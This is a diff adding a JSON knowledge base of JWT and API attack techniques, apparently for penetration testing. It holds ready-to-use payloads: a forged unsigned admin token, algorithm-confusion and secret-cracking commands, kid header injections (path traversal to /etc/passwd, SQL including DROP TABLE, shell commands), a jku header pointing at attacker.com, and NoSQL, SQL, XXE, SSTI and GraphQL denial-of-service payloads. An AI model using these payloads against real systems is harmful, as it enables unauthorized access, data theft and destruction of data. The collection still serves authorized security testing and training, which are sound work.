@@ -1,0 +1,511 @@
+{
+  "jwt_basics": {
+    "desc": "JWT (JSON Web Token) temel yapısı ve güvenlik zafiyetleri",
+    "structure": {
+      "header": "Base64URL(header)",
+      "payload": "Base64URL(payload)",
+      "signature": "Base64URL(signature)",
+      "format": "header.payload.signature"
+    },
+    "algorithms": {
+      "symmetric": ["HS256", "HS384", "HS512"],
+      "asymmetric": ["RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"],
+      "none": "none (insecure, should be disabled)"
+    },
+    "category": "JWT Security",
+    "type": "Basics",
+    "risk": "Informational"
+  },
+
+  "jwt_none_algorithm": {
+    "desc": "None algorithm attack - JWT signature bypass",
+    "category": "JWT Security",
+    "type": "Algorithm Confusion",
+    "risk": "Critical",
+    "vulnerability": "JWT accepts 'none' algorithm, allowing unsigned tokens",
+    "exploitation": {
+      "step1": "Decode JWT header and payload",
+      "step2": "Change algorithm to 'none'",
+      "step3": "Modify payload (e.g., change user_id, role)",
+      "step4": "Remove signature part",
+      "step5": "Submit: header.payload."
+    },
+    "payloads": [
+      {
+        "header": "{\"alg\":\"none\",\"typ\":\"JWT\"}",
+        "payload": "{\"user_id\":\"admin\",\"role\":\"administrator\"}",
+        "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9."
+      },
+      {
+        "header": "{\"alg\":\"None\",\"typ\":\"JWT\"}",
+        "note": "Try different capitalizations: None, NONE, NoNe"
+      },
+      {
+        "header": "{\"alg\":\"nOnE\",\"typ\":\"JWT\"}",
+        "note": "Case variation bypass"
+      }
+    ],
+    "tools": ["jwt_tool", "jwt.io"],
+    "purpose": "Bypass JWT signature verification"
+  },
+
+  "jwt_algorithm_confusion": {
+    "desc": "Algorithm confusion attack (RS256 to HS256)",
+    "category": "JWT Security",
+    "type": "Algorithm Confusion",
+    "risk": "Critical",
+    "vulnerability": "Server accepts HS256 when expecting RS256, using public key as HMAC secret",
+    "exploitation": {
+      "scenario": "Server uses RS256 (asymmetric), we force HS256 (symmetric)",
+      "step1": "Obtain public key from /jwks.json, /.well-known/jwks.json, or certificates",
+      "step2": "Change algorithm from RS256 to HS256 in header",
+      "step3": "Sign token using public key as HMAC secret",
+      "step4": "Submit forged token"
+    },
+    "example": {
+      "original_header": "{\"alg\":\"RS256\",\"typ\":\"JWT\"}",
+      "modified_header": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
+      "signing": "Use public key content as HMAC-SHA256 secret",
+      "command": "jwt_tool <token> -X k -pk public.pem"
+    },
+    "tools": [
+      "jwt_tool",
+      "jwt.io",
+      "burp-jwt-extension"
+    ],
+    "purpose": "Sign forged JWT using public key"
+  },
+
+  "jwt_weak_secret": {
+    "desc": "JWT weak HMAC secret brute force",
+    "category": "JWT Security",
+    "type": "Weak Secret",
+    "risk": "Critical",
+    "vulnerability": "Weak or default HMAC secret key",
+    "common_weak_secrets": [
+      "secret",
+      "password",
+      "123456",
+      "your-256-bit-secret",
+      "mysecretkey",
+      "jwt_secret",
+      "secret_key",
+      "my_secret",
+      "changeme",
+      "admin"
+    ],
+    "wordlists": [
+      "rockyou.txt",
+      "jwt-secrets.txt (SecLists)",
+      "common-passwords.txt"
+    ],
+    "tools": {
+      "hashcat": "hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
+      "john": "john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt_hash.txt",
+      "jwt_tool": "jwt_tool <token> -C -d wordlist.txt",
+      "jwt-cracker": "jwt-cracker <token> [alphabet] [max-length]"
+    },
+    "purpose": "Crack weak JWT HMAC secret"
+  },
+
+  "jwt_kid_header_injection": {
+    "desc": "JWT KID (Key ID) header injection",
+    "category": "JWT Security",
+    "type": "Header Injection",
+    "risk": "Critical",
+    "vulnerability": "kid parameter used to fetch key file without validation",
+    "injection_types": {
+      "path_traversal": {
+        "desc": "Directory traversal via kid parameter",
+        "payloads": [
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../../dev/null\"}",
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../../etc/passwd\"}",
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"/dev/null\"}"
+        ],
+        "exploitation": "Sign with empty string as secret (if /dev/null)"
+      },
+      "sql_injection": {
+        "desc": "SQL injection via kid parameter",
+        "payloads": [
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key' UNION SELECT 'secret'--\"}",
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key'; DROP TABLE keys--\"}"
+        ]
+      },
+      "command_injection": {
+        "desc": "OS command injection via kid parameter",
+        "payloads": [
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key.txt; whoami\"}",
+          "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key`whoami`.txt\"}"
+        ]
+      }
+    },
+    "purpose": "Exploit kid parameter vulnerabilities"
+  },
+
+  "jwt_jku_header_injection": {
+    "desc": "JWT JKU (JWK Set URL) header injection",
+    "category": "JWT Security",
+    "type": "Header Injection",
+    "risk": "Critical",
+    "vulnerability": "jku parameter points to attacker-controlled URL",
+    "exploitation": {
+      "step1": "Host malicious JWK Set on attacker server",
+      "step2": "Generate RSA key pair",
+      "step3": "Create JWK Set with public key",
+      "step4": "Inject jku header pointing to attacker URL",
+      "step5": "Sign token with attacker's private key"
+    },
+    "payload_example": {
+      "header": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/jwks.json\"}",
+      "jwks_content": "{\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker-key\",\"use\":\"sig\",\"n\":\"<modulus>\",\"e\":\"AQAB\"}]}"
+    },
+    "tools": ["jwt_tool -X s"],
+    "purpose": "Force server to use attacker's key"
+  },
+
+  "jwt_jwk_header_injection": {
+    "desc": "JWT JWK (JSON Web Key) header embedding",
+    "category": "JWT Security",
+    "type": "Header Injection",
+    "risk": "Critical",
+    "vulnerability": "Server trusts embedded JWK in header",
+    "exploitation": {
+      "step1": "Generate RSA key pair",
+      "step2": "Embed public key in jwk header",
+      "step3": "Sign token with private key",
+      "step4": "Submit token"
+    },
+    "payload_example": {
+      "header": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"n\":\"<modulus>\",\"e\":\"AQAB\"}}",
+      "command": "jwt_tool <token> -X i"
+    },
+    "purpose": "Embed attacker's public key in token"
+  },
+
+  "jwt_claims_manipulation": {
+    "desc": "JWT claims manipulation attacks",
+    "category": "JWT Security",
+    "type": "Claims Tampering",
+    "risk": "High",
+    "common_claims": {
+      "registered_claims": {
+        "iss": "Issuer",
+        "sub": "Subject",
+        "aud": "Audience",
+        "exp": "Expiration Time",
+        "nbf": "Not Before",
+        "iat": "Issued At",
+        "jti": "JWT ID"
+      },
+      "custom_claims": [
+        "user_id",
+        "username",
+        "email",
+        "role",
+        "admin",
+        "is_admin",
+        "permissions",
+        "scope"
+      ]
+    },
+    "attacks": {
+      "privilege_escalation": {
+        "desc": "Modify role/admin claims",
+        "examples": [
+          "{\"user_id\":\"1\",\"role\":\"admin\"}",
+          "{\"user_id\":\"1\",\"is_admin\":true}",
+          "{\"user_id\":\"1\",\"permissions\":[\"read\",\"write\",\"delete\"]}"
+        ]
+      },
+      "user_impersonation": {
+        "desc": "Change user_id to another user",
+        "examples": [
+          "{\"user_id\":\"admin\"}",
+          "{\"username\":\"administrator\"}",
+          "{\"sub\":\"admin@company.com\"}"
+        ]
+      },
+      "expiration_bypass": {
+        "desc": "Extend token expiration",
+        "examples": [
+          "{\"exp\":9999999999}",
+          "Remove exp claim entirely"
+        ]
+      },
+      "audience_confusion": {
+        "desc": "Change intended audience",
+        "examples": [
+          "{\"aud\":\"admin-api\"}",
+          "{\"aud\":\"*\"}"
+        ]
+      }
+    },
+    "purpose": "Manipulate JWT claims for unauthorized access"
+  },
+
+  "jwt_token_confusion": {
+    "desc": "JWT token confusion attacks",
+    "category": "JWT Security",
+    "type": "Token Confusion",
+    "risk": "High",
+    "attacks": {
+      "oauth_confusion": {
+        "desc": "Use OAuth access token as JWT",
+        "note": "Some APIs accept multiple token types"
+      },
+      "api_key_confusion": {
+        "desc": "Submit API key in JWT field",
+        "note": "Test if server accepts API keys as JWTs"
+      },
+      "session_confusion": {
+        "desc": "Use session token as JWT"
+      }
+    }
+  },
+
+  "api_authentication_bypass": {
+    "desc": "API authentication bypass teknikleri",
+    "category": "API Security",
+    "type": "Authentication Bypass",
+    "risk": "Critical",
+    "techniques": {
+      "missing_authentication": {
+        "desc": "Endpoints without authentication",
+        "test": "Remove Authorization header and retry"
+      },
+      "default_credentials": {
+        "desc": "Default API credentials",
+        "common_creds": [
+          "admin:admin",
+          "admin:password",
+          "root:root",
+          "test:test",
+          "api:api"
+        ]
+      },
+      "api_key_exposure": {
+        "desc": "Exposed API keys",
+        "locations": [
+          "JavaScript files",
+          "Mobile app source",
+          "Public GitHub repos",
+          "Pastebin",
+          "Documentation",
+          "Error messages"
+        ]
+      },
+      "parameter_pollution": {
+        "desc": "HTTP parameter pollution",
+        "examples": [
+          "?api_key=invalid&api_key=valid",
+          "?user_id=1&user_id=2"
+        ]
+      }
+    }
+  },
+
+  "api_authorization_bypass": {
+    "desc": "API authorization bypass (IDOR, privilege escalation)",
+    "category": "API Security",
+    "type": "Authorization Bypass",
+    "risk": "Critical",
+    "idor_attacks": {
+      "desc": "Insecure Direct Object Reference",
+      "examples": [
+        "GET /api/user/1 -> GET /api/user/2",
+        "GET /api/order/123 -> GET /api/order/124",
+        "DELETE /api/file/user1.txt -> DELETE /api/file/admin.txt"
+      ],
+      "techniques": [
+        "Increment/decrement IDs",
+        "GUID enumeration",
+        "Hash/encode ID variations",
+        "Change request method (GET -> POST, PUT, DELETE)"
+      ]
+    },
+    "bola_bopla": {
+      "desc": "Broken Object Level Authorization & Broken Property Level Authorization",
+      "bola_example": "Access other user's data: /api/users/victim_id/profile",
+      "bopla_example": "Access restricted properties: {\"role\":\"admin\",\"is_internal\":true}"
+    },
+    "function_level_bypass": {
+      "desc": "Broken Function Level Authorization",
+      "examples": [
+        "Regular user accessing /api/admin/users",
+        "User role accessing /api/moderator/ban",
+        "Guest accessing /api/member/download"
+      ]
+    },
+    "http_verb_tampering": {
+      "desc": "HTTP method bypass",
+      "examples": [
+        "GET /api/admin (403) -> POST /api/admin (200)",
+        "DELETE not allowed -> Use PUT with _method=DELETE"
+      ]
+    }
+  },
+
+  "api_rate_limiting_bypass": {
+    "desc": "API rate limiting bypass",
+    "category": "API Security",
+    "type": "Rate Limiting",
+    "risk": "Medium",
+    "techniques": {
+      "header_manipulation": {
+        "desc": "Manipulate headers to bypass rate limit",
+        "headers": [
+          "X-Forwarded-For: <random_ip>",
+          "X-Real-IP: <random_ip>",
+          "X-Client-IP: <random_ip>",
+          "X-Originating-IP: <random_ip>",
+          "CF-Connecting-IP: <random_ip>",
+          "True-Client-IP: <random_ip>"
+        ]
+      },
+      "endpoint_variation": {
+        "desc": "Use different endpoint paths",
+        "examples": [
+          "/api/login -> /api/login/ -> /api//login",
+          "/api/login -> /API/LOGIN",
+          "/api/login -> /api/./login -> /api/login/."
+        ]
+      },
+      "parameter_pollution": {
+        "desc": "HPP for rate limit bypass",
+        "examples": [
+          "?api_key=key1&api_key=key2"
+        ]
+      },
+      "null_byte": {
+        "desc": "Null byte injection",
+        "examples": [
+          "/api/login%00",
+          "/api/login%00%00"
+        ]
+      }
+    }
+  },
+
+  "api_mass_assignment": {
+    "desc": "Mass assignment vulnerability",
+    "category": "API Security",
+    "type": "Mass Assignment",
+    "risk": "Critical",
+    "vulnerability": "API allows setting internal/admin properties",
+    "examples": {
+      "privilege_escalation": {
+        "desc": "Set admin flag during registration",
+        "request": "POST /api/register\n{\"username\":\"attacker\",\"password\":\"pass\",\"is_admin\":true,\"role\":\"admin\"}",
+        "result": "User created with admin privileges"
+      },
+      "price_manipulation": {
+        "desc": "Modify product price",
+        "request": "PUT /api/cart/add\n{\"product_id\":1,\"quantity\":1,\"price\":0.01}",
+        "result": "Purchase expensive item for cheap"
+      },
+      "internal_properties": {
+        "desc": "Set internal system properties",
+        "examples": [
+          "is_verified: true",
+          "is_premium: true",
+          "credits: 9999999",
+          "account_type: enterprise"
+        ]
+      }
+    },
+    "testing": [
+      "Add unexpected parameters to requests",
+      "Try boolean, admin, role, price, credit fields",
+      "Analyze responses for hints about backend model"
+    ]
+  },
+
+  "api_injection_attacks": {
+    "desc": "API-specific injection attacks",
+    "category": "API Security",
+    "type": "Injection",
+    "risk": "Critical",
+    "nosql_injection": {
+      "desc": "NoSQL injection in APIs",
+      "json_payloads": [
+        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+        "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}"
+      ],
+      "url_payloads": [
+        "username[$ne]=&password[$ne]=",
+        "username[$regex]=.*&password[$regex]=.*"
+      ]
+    },
+    "sql_injection": {
+      "desc": "SQL injection via API",
+      "json": [
+        "{\"id\":\"1' OR '1'='1\"}",
+        "{\"user\":\"admin'--\"}"
+      ],
+      "url": [
+        "?id=1' OR '1'='1--",
+        "?search=test' UNION SELECT null,username,password FROM users--"
+      ]
+    },
+    "xxe_injection": {
+      "desc": "XXE in XML APIs",
+      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>"
+    },
+    "template_injection": {
+      "desc": "SSTI in API responses",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "{{config}}"
+      ]
+    }
+  },
+
+  "graphql_attacks": {
+    "desc": "GraphQL API exploitation",
+    "category": "API Security",
+    "type": "GraphQL",
+    "risk": "High",
+    "introspection": {
+      "desc": "GraphQL introspection query",
+      "query": "query IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type { ...TypeRef }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n      }\n    }\n  }\n}",
+      "simple": "{ __schema { types { name } } }"
+    },
+    "idor": {
+      "desc": "IDOR in GraphQL",
+      "query": "query { user(id: 2) { email, password, ssn } }"
+    },
+    "batching": {
+      "desc": "GraphQL batching attack (DoS, rate limit bypass)",
+      "payload": "[{\"query\":\"mutation { login(user:\\\"admin\\\", pass:\\\"pass1\\\") }\"},{\"query\":\"mutation { login(user:\\\"admin\\\", pass:\\\"pass2\\\") }\"},...repeat 1000 times]"
+    },
+    "nested_queries": {
+      "desc": "Deeply nested queries (DoS)",
+      "example": "query { user { posts { comments { author { posts { comments { ... } } } } } } }"
+    }
+  },
+
+  "api_security_best_practices": {
+    "desc": "API security checklist for pentesters",
+    "category": "API Security",
+    "type": "Testing Checklist",
+    "checklist": [
+      "Test all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)",
+      "Test with/without authentication",
+      "Test IDOR on all resources",
+      "Test mass assignment",
+      "Fuzz all parameters",
+      "Test rate limiting",
+      "Check for sensitive data exposure",
+      "Test CORS misconfiguration",
+      "Test for injection (SQL, NoSQL, XXE, SSTI)",
+      "Check API versioning (/api/v1 vs /api/v2)",
+      "Test older API versions if available",
+      "Analyze API documentation if exposed",
+      "Check for GraphQL introspection",
+      "Test JWT vulnerabilities if JWT is used",
+      "Capture mobile app traffic for API discovery"
+    ]
+  }
+}
